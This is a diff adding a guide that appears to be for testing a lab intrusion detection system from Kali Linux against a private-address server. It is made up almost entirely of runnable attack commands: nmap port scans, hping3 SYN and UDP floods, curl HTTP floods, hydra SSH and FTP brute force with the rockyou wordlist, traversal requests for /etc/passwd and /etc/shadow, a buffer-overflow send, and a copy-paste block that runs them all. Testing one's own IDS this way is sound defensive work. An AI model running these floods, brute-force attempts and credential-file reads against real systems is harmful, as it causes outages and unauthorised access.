@@ -1,0 +1,186 @@
+==========================================
+KALI LINUX ATTACK SIMULATION GUIDE
+Standalone - Copy to Kali Linux
+==========================================
+
+TARGET IDS SERVER: 192.168.100.4 (change if different)
+
+==========================================
+ATTACK 1: PORT SCAN (PROBE)
+==========================================
+
+# Quick port scan
+nmap -p 1-1000 192.168.100.4
+
+# Aggressive scan (more ports)
+nmap -p 1-65535 -T4 192.168.100.4
+
+# Sequential port scan
+for port in {1..100}; do
+  nc -zv 192.168.100.4 $port 2>&1 | grep -i open
+done
+
+Expected: Attack type = "probe"
+
+==========================================
+ATTACK 2: DoS ATTACK
+==========================================
+
+# SYN Flood
+hping3 -S -p 5001 --flood 192.168.100.4
+# Press Ctrl+C to stop
+
+# HTTP Flood
+for i in {1..1000}; do
+  curl -s http://192.168.100.4:8080 > /dev/null &
+done
+wait
+
+# UDP Flood
+hping3 --udp -p 5001 --flood 192.168.100.4
+# Press Ctrl+C to stop
+
+Expected: Attack type = "dos"
+
+==========================================
+ATTACK 3: BRUTE FORCE
+==========================================
+
+# HTTP Login Brute Force (Demo Site)
+for i in {1..20}; do
+  curl -X POST http://192.168.100.4:8080/login \
+    -d "username=admin&password=wrongpass$i" \
+    -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null
+  sleep 0.5
+done
+
+# SSH Brute Force (if SSH enabled)
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.100.4 ssh
+
+Expected: Attack type = "brute_force"
+
+==========================================
+ATTACK 4: R2L (Remote to Local)
+==========================================
+
+# Multiple failed SSH attempts
+for i in {1..10}; do
+  ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no \
+    fakeuser$i@192.168.100.4 "exit" 2>&1 | grep -i "permission denied\|connection refused"
+  sleep 1
+done
+
+# FTP Brute Force
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.100.4 ftp
+
+Expected: Attack type = "r2l"
+
+==========================================
+ATTACK 5: U2R (User to Root)
+==========================================
+
+# Directory traversal attempts
+curl -s "http://192.168.100.4:8080/../../../etc/passwd" 2>&1
+curl -s "http://192.168.100.4:8080/../../../etc/shadow" 2>&1
+curl -s "http://192.168.100.4:8080/../../root" 2>&1
+
+# Buffer overflow simulation
+python3 << 'EOF'
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+try:
+    s.connect(('192.168.100.4', 5001))
+    s.send(b'A' * 10000)
+except:
+    pass
+finally:
+    s.close()
+EOF
+
+Expected: Attack type = "u2r"
+
+==========================================
+ATTACK 6: MIXED/UNKNOWN ATTACK
+==========================================
+
+# Combine port scan + DoS
+nmap -p 1-200 192.168.100.4 &
+hping3 -S -p 5001 -c 100 192.168.100.4 &
+wait
+
+# Random port connections
+for i in {1..50}; do
+  port=$((RANDOM % 65535))
+  timeout 0.1 nc -zv 192.168.100.4 $port 2>&1 &
+done
+wait
+
+Expected: Attack type = "unknown_attack" or mixed
+
+==========================================
+QUICK TEST ALL ATTACKS
+==========================================
+
+Copy and paste this entire block:
+
+IDS_IP="192.168.100.4"
+
+echo "Testing Port Scan..."
+nmap -p 1-500 -T4 $IDS_IP > /dev/null 2>&1
+sleep 5
+
+echo "Testing DoS..."
+hping3 -S -p 5001 --flood $IDS_IP > /dev/null 2>&1 &
+HPING_PID=$!
+sleep 5
+kill $HPING_PID 2>/dev/null
+sleep 5
+
+echo "Testing Brute Force..."
+for i in {1..15}; do
+  curl -s -X POST http://$IDS_IP:8080/login \
+    -d "username=admin&password=wrong$i" \
+    -H "Content-Type: application/x-www-form-urlencoded" > /dev/null 2>&1
+  sleep 0.3
+done
+sleep 5
+
+echo "Testing R2L..."
+for i in {1..8}; do
+  ssh -o ConnectTimeout=1 -o StrictHostKeyChecking=no \
+    fakeuser$i@$IDS_IP "exit" > /dev/null 2>&1
+done
+sleep 5
+
+echo "Testing U2R..."
+curl -s "http://$IDS_IP:8080/../../etc/passwd" > /dev/null 2>&1
+curl -s "http://$IDS_IP:8080/../../etc/shadow" > /dev/null 2>&1
+sleep 5
+
+echo "Testing Mixed Attack..."
+nmap -p 1-200 $IDS_IP > /dev/null 2>&1 &
+hping3 -S -p 5001 -c 100 $IDS_IP > /dev/null 2>&1 &
+wait
+
+echo "Done! Check http://$IDS_IP:5173 Monitoring tab"
+
+==========================================
+VIEW RESULTS
+==========================================
+
+1. Open browser: http://192.168.100.4:5173
+2. Go to Monitoring tab
+3. Look for 🚨 ATTACK DETECTED badges
+4. Check attack types in alert details
+
+==========================================
+STOP ALL ATTACKS
+==========================================
+
+pkill nmap
+pkill hping3
+pkill hydra
+pkill curl
+
+==========================================
+
